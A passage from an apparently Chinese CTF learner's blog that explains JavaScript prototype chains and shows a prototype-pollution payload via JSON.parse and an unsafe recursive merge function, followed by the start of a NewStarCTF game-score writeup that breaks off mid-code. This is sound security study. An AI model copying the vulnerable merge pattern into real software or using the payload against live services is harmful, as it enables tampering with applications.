    <content type="html"><![CDATA[<p>0xGame碰到了原型链污染的题，记录一下学习过程</p><span id="more"></span><hr><p>因为第一次接触，所以先了解了<code>Javascript</code>这东西的特性，先看一段简单的构造类的方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"></span>)&#123; <span class="hljs-comment">//名为person的构造函数，构造函数用于创建拥有特定属性/方法的对象</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>=<span class="hljs-string">&quot;rendongjun&quot;</span>;<span class="hljs-comment">//name属性</span><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">test</span>=<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123; <span class="hljs-comment">//test方法，返回 333</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">333</span>;<br><br>&#125;<br>&#125;<br><span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">a</span>=<span class="hljs-number">3</span>;<span class="hljs-comment">//通过原型继承的方式，给Person构造函数的原型对象添加了一个名为a的属性，其值为3</span><br>web=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<span class="hljs-comment">//创建名为web的对象，该对象是通过person构造函数创建的一个实例，构造函数使用new调用</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-title function_">test</span>());<span class="hljs-comment">//使用console函数进行打印</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(web.<span class="hljs-property">a</span>)<br></code></pre></td></tr></table></figure><h6 id="什么是原型继承？"><a href="#什么是原型继承？" class="headerlink" title="什么是原型继承？"></a>什么是原型继承？</h6><p>每个JavaScript对象都有一个原型对象，它是一个普通的对象，包含了一些共享的属性和方法。当我们创建一个新对象时，它会自动继承原型对象的属性和方法。</p><p>在JavaScript中，我们可以通过修改原型对象来实现属性和方法的继承。</p><p><code>Person.prototype.a = 3</code>这段代码就是在<code>Person</code>构造函数的原型对象上添加了一个名为<code>a</code>的属性，其值为3。这意味着通过<code>Person</code>构造函数创建的所有对象实例都会继承这个<code>a</code>属性，并且可以通过对象实例访问和使用它。</p><p>换句话说，当我们创建一个<code>person</code>对象实例，比如<code>web = new person()</code>，这个实例会继承<code>person</code>构造函数的原型对象上的属性和方法。因此，<code>web</code>对象可以访问和使用<code>a</code>属性，即<code>web.a</code>会返回3。</p><p><code>__proto__</code>属性指向它的构造函数的<code>prototype</code>属性。</p><h6 id="什么是原型链？"><a href="#什么是原型链？" class="headerlink" title="什么是原型链？"></a>什么是原型链？</h6><p>原型链是JavaScript中一种对象之间的关系模型，它用于实现对象的继承和属性查找。</p><p>在JavaScript中，每个对象都有一个原型对象（prototype），原型对象也是一个对象，它包含了一些共享的属性和方法。当我们访问一个对象的属性或方法时，如果该对象本身没有这个属性或方法，JavaScript会沿着原型链向上查找，直到找到该属性或方法或者到达原型链的顶端（即Object.prototype）。</p><p>原型链的关系可以通过对象的<code>__proto__</code>属性来表示。每个对象都有一个<code>__proto__</code>属性，它指向该对象的原型对象。原型对象也有自己的原型对象，这样就形成了一个链式结构，即原型链。</p><p><img src="/img/pol1.png" alt="pol1"></p><h3 id="constructor-NaN"><a href="#constructor-NaN" class="headerlink" title="constructor"></a>constructor</h3><p>每个实例对象都有一个 <code>constructor</code> 属性指向对应的<strong>构造函数</strong>，即类。所以以下几种写法其实是相等的，都返回 <code>Foo</code> 类的原型对象。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-type">Foo</span>.proto<span class="hljs-keyword">type</span><br><span class="hljs-title">foo</span>[<span class="hljs-string">&quot;__proto__&quot;</span>]<br><span class="hljs-title">foo</span>.__proto__<br><span class="hljs-title">foo</span>.constructor.proto<span class="hljs-keyword">type</span><br></code></pre></td></tr></table></figure><p>大段大段的文字总是让人头疼，写个简单代码体会一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>)&#123;&#125;;<br><span class="hljs-literal">undefined</span><br><span class="hljs-keyword">let</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>();<br><span class="hljs-literal">undefined</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> == foo.<span class="hljs-property">__proto__</span> <span class="hljs-comment">//foo对象的__proto__属性等于Foo.prototype</span><br><span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><img src="/img/nodejs1.png" alt="nodejs1"></p><p>以及</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Donald&#x27;</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;Trump&#x27;</span><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;Melania&#x27;</span><br>&#125;<br><br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>()<br><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>()<br>son.<span class="hljs-property">__proto__</span>[<span class="hljs-string">&#x27;add_name&#x27;</span>] = <span class="hljs-string">&#x27;abc&#x27;</span><br><span class="hljs-keyword">let</span> son1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`son Name: <span class="hljs-subst">$&#123;son.add_name&#125;</span>`</span>)<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`son1 Name: <span class="hljs-subst">$&#123;son.add_name&#125;</span>`</span>)<br><br><span class="hljs-comment">//结果： son Name: abc</span><br><span class="hljs-comment">//son1 Name: abc</span><br></code></pre></td></tr></table></figure><p>我们明明只修改了<code>son</code>对象的<code>__proto__</code>属性，但由于有其它对象的原型属性指向了相同的原型属性(即<code>son1.__proto__</code>与其相同)，导致另外一个具有相同原型的对象也受到了影响。</p><p>再看一段<code>js</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;<br> <br><span class="hljs-comment">// foo.bar 此时为1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br> <br><span class="hljs-comment">// 修改foo的原型（即Object），foo是一个Object类的实例，实际上是修改了Object类，给其增加了一个属性bar,值为2</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-number">2</span><br> <br><span class="hljs-comment">// 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<br> <br><span class="hljs-comment">// 此时再用Object创建一个空的zoo对象，他会有一个bar属性</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br> <br><span class="hljs-comment">// 查看zoo.bar</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<br><span class="hljs-comment">//最后，虽然zoo是一个空对象&#123;&#125;，但zoo.bar的结果居然是2：</span><br><span class="hljs-comment">//参考：https://blog.csdn.net/qq_51586883/article/details/119867720</span><br></code></pre></td></tr></table></figure><p>再通过一段代码加深加深印象 :</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;D&#x27;</span><br><span class="hljs-variable language_">this</span>.<span class="hljs-property">last_name</span> = <span class="hljs-string">&#x27;K&#x27;</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Son</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-variable language_">this</span>.<span class="hljs-property">first_name</span> = <span class="hljs-string">&#x27;A&#x27;</span><br>&#125;<br><span class="hljs-title class_">Son</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>() <span class="hljs-comment">//Foo &#123; first_name: &#x27;D&#x27;, last_name: &#x27;K&#x27; &#125;</span><br><span class="hljs-keyword">let</span> son = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>() <span class="hljs-comment">//Foo &#123; first_name: &#x27;A&#x27; &#125;</span><br>son.<span class="hljs-property">last_name</span> <span class="hljs-comment">// &#x27;K&#x27;</span><br><span class="hljs-comment">//注意，此时Son.prototype=son.__proto__</span><br><br>son.<span class="hljs-property">__proto__</span>  <span class="hljs-comment">//Foo &#123; first_name: &#x27;Donald&#x27;, last_name: &#x27;Trump&#x27; &#125;</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property">add_name</span>=<span class="hljs-string">&#x27;viper&#x27;</span><br>son.<span class="hljs-property">add_name</span> <span class="hljs-comment">//undefined</span><br><span class="hljs-title class_">Son</span>.<span class="hljs-property">add_name</span> <span class="hljs-comment">//undefined，构造函数的属性和方法要通过创建实例才能访问</span><br><span class="hljs-title class_">Foo</span> <span class="hljs-comment">//[Function: Foo] &#123; add_name: &#x27;viper&#x27; &#125;,注意这里解释了为啥Son/son.add_name没定义</span><br><span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>[<span class="hljs-string">&#x27;add_name&#x27;</span>]=<span class="hljs-string">&#x27;notbad&#x27;</span><span class="hljs-comment">//注意这里</span><br>son.<span class="hljs-property">add_name</span><span class="hljs-comment">//&#x27;notbad&#x27;</span><br><span class="hljs-title class_">Son</span>.<span class="hljs-property">add_name</span><span class="hljs-comment">//undefined，同上</span><br><br><span class="hljs-title class_">JavaScript</span> 的查找机制如下：<br><br>在对象son中寻找last_name<br>如果找不到，则在son.<span class="hljs-property">__proto__</span>中寻找last_name<br>如果仍然找不到，则继续在son.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>中寻找last_name<br>依次寻找，直到找到<span class="hljs-literal">null</span>结束。比如，<span class="hljs-title class_">Object</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> 的 __proto__就是 <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p><p>总结一下：</p><p>1.构造函数.prototype指向的是一个对象(原型)。</p><p>2.任何对象都有一个原型对象，这个原型对象由对象的内置属性__proto__指向它的构造函数的prototype指向的对象，即任何对象都是由一个构造函数创建的。</p><p>3.只有构造函数内才有ptorotype属性。</p><p>4.每个对象都内含有一个属性：<strong>proto</strong>,也就是说就算对象里面没有对这个属性进行赋值，那么也是有这个属性的。</p><p>5.原型链的核心就是依赖对象__proto__的指向，当访问的属性在该对象不存在时，就会向上从该对象构造函数的prototype的进行查找，直至查找到Object时，就没有指向了。如果最终查找失败会返回undefined或报错。</p><p>通过一段<code>java</code>代码对比两者的异同：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Test;<span class="hljs-comment">//包名为Test的类</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<span class="hljs-comment">//公共字符串属性name</span><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Father</span>&#123;<span class="hljs-comment">//Son类继承自Father类</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Son</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">super</span>.name = <span class="hljs-string">&quot;father&quot;</span>;<span class="hljs-comment">//super 关键字用于在子类中访问父类的成员变量、方法和构造函数。</span><br>    &#125;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">alert</span><span class="hljs-params">()</span> &#123;<span class="hljs-comment">//alert方法，返回类型为void(不会返回任何值)</span><br>        System.out.println(<span class="hljs-string">&quot;i am son&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br>        System.out.println(s1.name);<span class="hljs-comment">//System.out是一个标准输出流对象，println()是一个方法，用于将指定的参数打印到控制台，并在末尾添加一个换行符。</span><br>        s1.name = <span class="hljs-string">&quot;son&quot;</span>;<br>        System.out.println(s1.name);<br>        <span class="hljs-type">Son</span> <span class="hljs-variable">s2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Son</span>();<br>        System.out.println(s2.name);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//结果：</span><br>father<br>son<br>father<br></code></pre></td></tr></table></figure><p><code>java是基于对象继承，javascript是基于原型继承</code></p><h4 id="污染原理"><a href="#污染原理" class="headerlink" title="污染原理"></a>污染原理</h4><p>对于语句：<code>object[a][b] = value</code> 如果可以控制a、b、value的值，将a设置为<code>__proto__</code>，我们就可以给object对象的原型设置一个b属性，值为value。这样所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b属性，且值为value。</p><p>简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象</p><h4 id="利用手段"><a href="#利用手段" class="headerlink" title="利用手段"></a>利用手段</h4><p>现在我们大致可以知道：如果可以通过某种方法控制<code>对象.__proto__</code>的值，那我们就可以间接修改继承该原型对象的所有对象。</p><p>1.<strong>对象merge</strong> <strong>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</strong> 以对象merge为例，我们想象一个简单的merge函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//用于将一个源对象的属性合并到目标对象中</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123; <span class="hljs-comment">//遍历source的所有属性</span><br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<span class="hljs-comment">//对于每个属性，若同时存在于源对象和目标对象中</span><br>            <span class="hljs-title function_">merge</span>(target[key], source[key]) <span class="hljs-comment">//表示这是一个嵌套对象，需要递归调用merge函数，将源对象的嵌套属性合并到目标对象的对应嵌套属性中。</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<span class="hljs-comment">//非嵌套属性，直接将源对象的属性值赋给目标对象的对应属性。</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这里如果我们让key是<code>__proto__</code>的话那么是不是就可以对原型造成影响，最终影响到实例化出来的类呢？</strong></p><p>举个栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<span class="hljs-string">&quot;b&quot;</span>: <span class="hljs-number">2</span>&#125;&#125;<br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<span class="hljs-comment">//1,2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1)<span class="hljs-comment">//&#123; a: 1, b: 2 &#125;,proto没有被当做键名</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3)<span class="hljs-comment">//[Object: null prototype] &#123;&#125;</span><br></code></pre></td></tr></table></figure><p>为什么<code>o1</code>被污染了而<code>o3</code>没有被污染?</p><p>打开node看下<code>o2</code>的<code>key</code>：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs node-repl">Welcome to Node.js v18.18.0.<br>Type &quot;.help&quot; for more information.<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">let</span> o2 = &#123;<span class="hljs-attr">a</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">b</span>:<span class="hljs-number">2</span>&#125;&#125;</span><br>undefined<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript"><span class="hljs-keyword">for</span> ( <span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> o2)&#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key);&#125;</span><br>a<br>b<br>undefined<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2</span><br>&#123; a: 1 &#125;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span></span><br>&#123; b: 2 &#125;<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span></span><br>[Object: null prototype] &#123;&#125;  //最上层的object，并没有任何属性<br><span class="hljs-meta prompt_">&gt;</span> <span class="language-javascript">o2.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span></span><br>null<br>&gt;可以看到o2的key只有a,b没有我们需要的__proto__，并注意最后几行！<br></code></pre></td></tr></table></figure><p>原因很好理解：在<code>o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;</code>中，<code>&quot;__proto__&quot;:&#123;b:2&#125;</code>等价于<code>o2.__proto__=&#123;b:2&#125;</code>，也就是<code>o2</code>这个实例的<code>__proto__</code>属性。<code>__proto__</code>并没被当成键名解析。</p><p>我们需要这样修改(<code>利用JSON.parse</code>)：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) &#123;<br>        <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) &#123;<br>            <span class="hljs-title function_">merge</span>(target[key], source[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            target[key] = source[key]<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">let</span> o1 = &#123;&#125;<br><span class="hljs-keyword">let</span> o2 = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)<span class="hljs-comment">//JSON.parse的存在可以将JSON字符串解析为JavaScript对象，这样一来就存在o2.__protp__.b=2,并把这东西赋值给之前不存在的o1.__proto__</span><br><span class="hljs-title function_">merge</span>(o1, o2)<br><span class="hljs-comment">//1 2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">a</span>, o1.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o1.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br>o3 = &#123;&#125;<br><span class="hljs-comment">//2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">b</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(o3.<span class="hljs-property">__proto__</span>)<span class="hljs-comment">//[Object: null prototype] &#123; b: 2 &#125;</span><br></code></pre></td></tr></table></figure><p>简单分析下运行过程：</p><p>首先是<code>o1[a]=02[a]=1</code>，然后进行<code>o1.__proto__</code>和<code>o2.__proto__</code>(注意这是共有的，所以进行循环<code>merge</code>过程)，即<code>o1.__proto__.b=o2.__proto__.b=2</code>，即<code>Object.prototype.b=2</code>。</p><p>也就是最顶层的<code>Object.prototype</code>所指向的对象添加了属性,所以我们随便创建一个对象也就有了b这个属性(间接拥有，会向上查一个<code>.proto__</code>)。</p><p>参考文章：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>jlkl.github.io<span class="hljs-regexp">/2020/</span><span class="hljs-number">11</span><span class="hljs-regexp">/06/</span>Web_16/<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_51586883/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">119867720</span><br>https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7182</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Javascript</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Writeup_2023_NewStarCTF_Week2</title>
    <link href="/2023/10/12/NewStarCTF_Week2/"/>
    <url>/2023/10/12/NewStarCTF_Week2/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF第二周，菜鸟的wp</p><span id="more"></span><hr><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>听说你是游戏高手？</p><p>进环境发现是个小游戏，分数到达<code>100000</code>才能拿<code>flag</code>:</p><p><img src="/img/youxi1.png" alt="youxi1"></p><p>目测是要通过<code>burpsuite</code>伪造分数数据包，右键源码没啥东西，<code>F12</code>打开调试器，发现<code>app_v2.js</code>：</p><p>在游戏进行的过程中并不存在数据包传递，除非游戏结束时分数<code>&gt;100000</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//游戏结束</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">gameover</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">if</span>(gameScore &gt; <span class="hljs-number">100000</span>)&#123;<br>        <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>(); <span class="hljs-comment">//创建XMLHttpRequest的对象xhr，与服务器通信</span><br>        xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&quot;POST&quot;</span>, <span class="hljs-string">&quot;/api.php&quot;</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">//指定交互方式POST，并发送到api.php</span><br>        xhr.<span class="hljs-title function_">setRequestHeader</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/json&quot;</span>);<span class="hljs-comment">//设置请求头，JSON格式</span><br>        xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span 